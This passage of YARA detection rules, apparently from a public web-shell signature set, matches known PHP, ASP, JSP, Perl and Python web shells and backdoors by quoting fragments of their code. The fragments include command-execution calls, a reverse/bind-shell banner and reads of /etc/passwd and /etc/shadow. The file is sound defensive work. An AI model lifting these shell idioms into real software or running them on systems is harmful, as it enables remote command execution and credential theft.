		logic_hash = "98dae8aab5bfd58f4264e318f5a5b5900b38687386f9d7f09c31da0f51d57bc0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_PHP_Shell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6978126c-5414-52d2-b085-6e5589716d93"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4552-L4563"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "2d5b6e08bfe9e1551dab12b01189dadc924c097427c996684bab96c48d528395"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}

rule SIGNATURE_BASE_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz_Html
{
	meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d50a8669-fd28-59d2-9f00-f4fe2b85dc22"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4564-L4577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
		logic_hash = "9e2d56b49df65a2c13e15f97ec91cdbb6852d86e86f921d7c8a4db82cbea12f5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"

	condition:
		2 of them
}

rule SIGNATURE_BASE_EFSO_2_Asp
{
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "f0566790-b41c-5167-b7ec-19e7d04256d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4578-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
		logic_hash = "15e5419854bcbb08f28fff1e266cca7a004f01ec0a5c313c107ec17c3aa7ffee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Ajax_PHP_Command_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cae2e035-ae7b-589b-b2d9-e709028274c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4603-L4615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
		logic_hash = "37cba26018f3d37194a143871012a61a7bcee6775d2cf5f93a52b779010d3260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jspwebshell_1_2_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "edfe6a3d-7d56-52ad-a376-cec5722e87b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4616-L4629"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
		logic_hash = "32b3ddb00f89a3540118fe8ce5fc070556b00030dcf2b21245d38ae66e6cbc14"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sincap_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8c4dc7b1-94ce-5528-8442-eae05d2c9980"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4630-L4642"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
		logic_hash = "e708a7dcb26ff7d0208c1f092e14e701f2ae94c4ffca019f13064bbe04ef74d7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Test_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Test.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "58d73264-6507-5560-ad3e-0cc86c2ee291"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4643-L4655"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "77e331abd03b6915c6c6c7fe999fcb50"
		logic_hash = "575a2eeadc8113d779057f98e978ed4f8914546117b57944bf65f1d6d84c9521"
		score = 50
		quality = 85
		tags = ""

	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
		$s2 = "fwrite ($fp, \"$yazi\");" fullword
		$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phyton_Shell_Py
{
	meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2f55d60d-94f3-508d-a2d0-5ab59e3fdab3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4656-L4669"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "92b3c897090867c65cc169ab037a0f55"
		logic_hash = "ac16a95cd1fb09c93b315e3cd7d57c1ebec322b641f515854fb73a61393dd365"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Mysql_Tool_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c67197d1-6e40-5bf2-9e1b-6ada43529435"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4670-L4682"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
		logic_hash = "9f49bd6c56c919f678ecada82ff3d801c82c98a8abdee85cda1ec7e5b6756012"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Zehir_4_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea7df4e1-d4e2-5a58-a014-d12cb9afaf79"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4683-L4694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "69063d866daf1709df81fa22d76177bf8d552e19725a94db4a1b2fca79387faf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4695-L4706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "330af9337ae51d0bac175ba7076d6299"
		logic_hash = "b0c3307d451e5d7dadece114e2888503a46038e2edb2ff32bf566ce47b300e76"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpbackdoor15_Php
{
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a93b881b-3050-5f43-803c-4a571aaaef82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4707-L4719"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
		logic_hash = "cdd105f36593e8326ca32bf7cf1fba6fb754e7305c91fe6c078323db8f59b23c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpjackal_Php
{
	meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ae46cb97-1ff8-50ba-856f-c38fbb1e5163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4720-L4731"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
		logic_hash = "6e2ff262aecd08e5feaa274a7fd128d75565d6cc03341da7cbeb2949070705e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sql_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4732-L4744"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8334249cbb969f2d33d678fec2b680c5"
		logic_hash = "875bdaa0072f869c983526d0aab20b4faa9187a3f32b8024658114a4c908b825"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
		$s2 = "http://rst.void.ru"
		$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cgi_Python_Py
{
	meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "75e99d10-3cdf-5f87-9933-4ce5ebe18b09"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4745-L4757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0a15f473e2232b89dae1075e1afdac97"
		logic_hash = "37c6c7db32a52c8a83ff85f0a50c6fa71e833b9e6d20b1f95e9512fe8bbd0aee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dtool_Pro_Php
{
	meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c02c522c-8418-5760-869a-52b41785bebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4771-L4783"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
		logic_hash = "e8f8b4ca2ab4607e700e897671fd230280763a70897b8ccfc31b3bcb7f2a1f4a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Telnetd_Pl
{
	meta:
		description = "Semi-Auto-generated  - file telnetd.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "05b5d247-3133-5902-a2ee-b84fa89c7f32"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4784-L4798"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5f61136afd17eb025109304bd8d6d414"
		logic_hash = "faf21758b311fa4c2d11cd60169e6c9a67282cf739b73664456691361a480419"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "0ldW0lf" fullword
		$s1 = "However you are lucky :P"
		$s2 = "I'm FuCKeD"
		$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
		$s4 = "atrix@irc.brasnet.org"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Include_W_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ddcf9031-2ec8-5a86-8326-60e4a699f494"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4799-L4810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4e913f159e33867be729631a7ca46850"
		logic_hash = "a63910d97b7ef447b2cadb7de12943d3dbb6eada27d3097b8acf58d9b65b6f60"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Safe0Ver_Shell__Safe_Mod_Bypass_By_Evilc0Der_Php
{
	meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "25971f62-33ee-5ed6-8d72-118be5bd2deb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4811-L4823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
		logic_hash = "46f6bb38f1175e02b03047c06a7aed968b1c1ce2e28cc4b88e15703040e91592"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Telnet_Cgi
{
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4837-L4849"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dee697481383052980c20c48de1598d1"
		logic_hash = "689c1d43c64aa7469989686c60fc9ab46acde42fdf3c1157bae1e2b8373c845f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ironshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0d63ad03-4d1d-535f-8afe-3edaf1bf4010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4850-L4864"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "23574299ee2bb33c3f71102adf71ac8f09b6f8ece5f798beacb9b2432d297ee7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoorfr_Php
{
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5ba2b617-a873-5e80-9cfc-c61cc8d605f3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4865-L4876"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
		logic_hash = "40a6fb41a65fd35acb7cdc36fdda90f5dc54b641adc3ba9eaae29c5e46622206"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Aspydrv_Asp
{
	meta:
		description = "Semi-Auto-generated  - file aspydrv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4420d13e-7015-5083-ba08-b41bf28b00c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4877-L4890"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1c01f8a88baee39aa1cebec644bbcb99"
		logic_hash = "64912d7521d4bff33b5f3a78525bf4ed94246f5933753bed7ca02bedffc85f0f"
		score = 60
		quality = 85
		tags = ""

	strings:
		$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
		$s1 = "password"
		$s2 = "session(\"shagman\")="

	condition:
		2 of them
}

rule SIGNATURE_BASE_Cmdjsp_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "048478a8-9622-54c7-80ed-e4e223d14500"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4891-L4904"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b815611cc39f17f05a73444d699341d4"
		logic_hash = "8b0e425c7d71ea2c536192ff186665e7f0fbdbc0e0d195d7107ac57cf9bd1773"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_H4Ntu_Shell__Powered_By_Tsoi_
{
	meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "186358e6-88a3-5fad-b1ba-a49b2a5dea1c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4905-L4916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		logic_hash = "32c620a4ed3f7a8640928e2211516978c12cfbdedb7d96e923303740407b5a1c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ajan_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6040fd88-b992-5110-8b37-7711ace30b1a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4917-L4929"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "13988af864a62ca04501288d4f2d830815ab453b14cef6795fe993db1dd1a9ef"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHANTASMA_Php
{
	meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "21ff4cee-9cdc-57d1-9c43-e033fdb47de0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4930-L4943"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "52779a27fa377ae404761a7ce76a5da7"
		logic_hash = "d4a2a1bcc1ff3264b35f2b05d7de664b56807977f2a793fd87206f046a185d3b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Web_Interface_Version_0_8_Php
{
	meta:
